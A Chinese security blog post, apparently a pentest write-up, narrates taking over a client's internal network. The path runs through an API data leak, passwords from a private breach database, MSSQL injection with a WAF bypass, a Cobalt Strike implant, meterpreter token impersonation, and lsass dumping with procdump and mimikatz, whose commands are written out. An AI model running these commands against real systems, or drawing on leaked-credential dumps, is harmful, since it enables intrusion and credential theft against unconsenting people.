---
title: 记一次因API接口问题导致目标内网沦陷
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496129&idx=1&sn=d0dbbf17973de7f6f76e4cf383b4c01c&chksm=e8a5fba2dfd272b47bb5e13b5a45d130a1b9e3d98c698e4fda3f599e117cc485ac725556f8a3&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-10-15
fetch_date: 2025-10-06T18:53:01.806534
---

# 记一次因API接口问题导致目标内网沦陷

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj6gOZMVI60IXib2sHbGbmxSIyYJIn1BOoDbse2Kty07EErXEltqWxMYDyib4dGvmEiaGptkBR7Q6UrbA/0?wx_fmt=jpeg)

# 记一次因API接口问题导致目标内网沦陷

迪哥讲事

以下文章来源于酒仙桥六号部队
，作者海岸线突击队

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6h5jOvetH9FCV9SZjkg2PBbViaA8jlNfDJtZqedia3h3UQ/0)

**酒仙桥六号部队**
.

知其黑，守其白。 分享知识盛宴，闲聊大院趣事，备好酒肉等你！

这是 **酒仙桥六号部队**的第 **119**篇文章。

全文共计1689个字，预计阅读时长6分钟。

**背景**

在跟女朋友一起散步的时候，突然接到通知，客户已经给了测试的资产范围如下，目标要求拿到目标服务器内网权限。

目标资产：

www.target.com 、ops.target.com、api.target.com

对其进行常规信息收集包括不限于端口指纹|即时通讯|开源资产|组织架构|搜索引擎。

**漏洞步骤**

登陆口无法爆破且存在，在翻看JS文件时发现泄露部分后台路径但都做了session校验，没有权限访问。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPB9GbEoUqY7kJMpR6WDQWv4yicUicv7e04Mmq2eYukYYpESYVvKIzYM7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEP7cbqaMGov5ZEJathK0iaqQ8ibYxF9Apj5z0c0XNefXfGmoazib6Z83noA/640?wx_fmt=png)

登陆口传入burpsuite进行分析发现其登陆口调用了api.target.com:8090 该接口，掏出祖传参数字典对其接口进行FUZZ测试。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPb2k6ZsdSXj5VPF6gp6vw9TpG3u1gBwDCmkGUrJgVVvKiawY6AicLXicgA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPR2XwQJZmGafU6mqEHYbnMGTHicWMbaXBUA2Ir2TRdMKlfZ4ibgmbfL0A/640?wx_fmt=png)

泄露了该管理系统全部员工的登陆账号/邮箱/手机号/部门/单位区域等敏感信息。

密码字段进行了处理返回为空，我惊了。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEP1A4CVqwAgzPibkh28kJKFleZ8w2A7d4JQRHNAyDFsXwPWc5FrQxVjsg/640?wx_fmt=png)

将泄露的账号进行手动测试弱口令，此时感觉到了痛该放手的感觉，但手却早已麻木。

经过上述测试猜测其后台设置了强密码，这个时候我就伸手求助师傅去他的私人库子通过上述泄露的QQ邮箱及手机号导出了一波账号密码。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPrEUGXpg64CIQdH4UYrTfiaOSU1M0F2bCYG7dDAZvez7Tdokgicd2xC8w/640?wx_fmt=png)

经过一番折腾总算进入了后台，舒舒服服找上传功能点。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPkib6gicZcxknTOW2RJCgKoQcLPv9d14AmbdL8ZmcgAxIuMUXU7MD3r6w/640?wx_fmt=png)

所有上传点均调用统一接口上传至阿里云OSS静态资源库。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPWyuyk9enjmnqXCHUIVXrp06e37fRPtH5vIEiaGibdLSfliaiaA2WNOEmsg/640?wx_fmt=png)

此时一位靓仔骂骂咧咧的找女朋友去打王者去了，带女朋友上分他不香吗？做什么渗透。

上了王者突然感觉心情大好，继续打工。将后台的功能点一一分析进行测试在订单查询处发现了存在MSSQL注入。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPPuHibWNcPicicbB9RxtV1rNPk1Gonc24vFZdicGmC6DWpG2RudTGKZOryA/640?wx_fmt=png)

进一步测试存在WAF，网上有很多bypass 云锁的文章可以参考，这里使用表哥给的脏数据混淆进行绕过。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEP5xQt2uibZJ1SLF2sfIAL3cIDz7UibkTib2Vq3BmozZvvWJSTS1AUJ5hmw/640?wx_fmt=png)

配合SQLMAP 执行 OS-SHELL 互交命令，发现其权限为DBA，系统用户权限为mssqlserver。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEP5HUy2k1x1lBtia6yIOhfxJNiacBc0GsSWeFvotu0S2c0fN06YLzRegmg/640?wx_fmt=png)

看了下进程发现存在杀软直接利用表哥的免杀powershell混淆Payload上线CS 远控。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPqhKIoXdNweR8onA9gIgBJ0zqFqvAjISWWytuVkicK5nXdUsRzQrnHqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPTswibTXI5l8q2u9GksYeIUZ4dvdjjYIYsmbqgNdALSM7ibCUACNwX0ng/640?wx_fmt=png)

派会话到MSF进行提权。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPoy0GrR1icB28YGGicjMYAdUfI9DvKJfhytWCWPHTpVeChhwOHekW94CA/640?wx_fmt=png)

下面的图找不到了，这里py一下。

```
meterpreter > getprivs===========================================================Enabled Process Privileges===========================================================SeAssignPrimaryTokenPrivilege
meterpreter > upload  /root/miansha.exe C:\Users\Publicmeterpreter > cd C:\\Users\\Publicmeterpreter > use incognitometerpreter > list_tokens -uNT AUTHORITY\IUSRmeterpreter > execute -cH -f ./miansha.exemeterpreter > list_tokens -uNT AUTHORITY\IUSRNT AUTHORITY\SYSTEM
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"meterpreter > getuidServer username: NT AUTHORITY\SYSTEM
```

提权至system权限上线至CS，并常规利用Procdump 导出 lsass.dmp 拖取到本地再利用 mimikatz 抓取明文密码。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEP8d8NymmyuFfUw7dKbCtXTZHBj5NMyM0Zib7XpKJKI18I2MAxDuCaOkA/640?wx_fmt=png)

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimi.exe ""privilege::debug"" ""sekurlsa::minidump .\lsass.dmp"" ""sekurlsa::logonpasswords"" exit >> log.txt
```

有会免杀的表哥真的舒服，这方面比女朋友有用多了。

常规配置 sock5 + Proxifier 内网穿透，远程连接桌面。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPtkZys0yH4fT5u1xqEdtlYVJ5G95zvbvEoibaMB2OOC2b0eA6EgyLsmQ/640?wx_fmt=png)

这里已经拿到了目标权限，跟客户沟通反应说是继续深入，常规内网打点B段扫描。

直接利用已有信息进行弱口令爆破。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPZUctjcnNPxnqtMuvEVrWtD6gxFdict8Sc5FpEA7YoIB1aibGaNFUbvOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPvbYzFTOfd2iaW3oZUdYhVic5OKXN4ka37icsmzFcZ2ib08cRoaQDeTTyiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPPTMyexcAiaNSlfdAdFXC3sLPw96nb693g3ZTaOWVMokwmlhGEx9uUzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPh9bzibicTI9jhibFdhibnn2re5ic66wkaj5BHeQn9FJk2eUicc4GkHDQDbgw/640?wx_fmt=png)

MS17010 一键植入Payload 添加用户密码。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56fPnpNM4DDBoem7lSasicEPRYr9kIesN0zMibibRndYpAhPPGSYVMMRBiatpqEHYnvTjIcR3b7GxmMicA/640?wx_fmt=png)

躺着日站就是舒服。

给客户写完报告交付继续跟女朋友去散步去了。

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过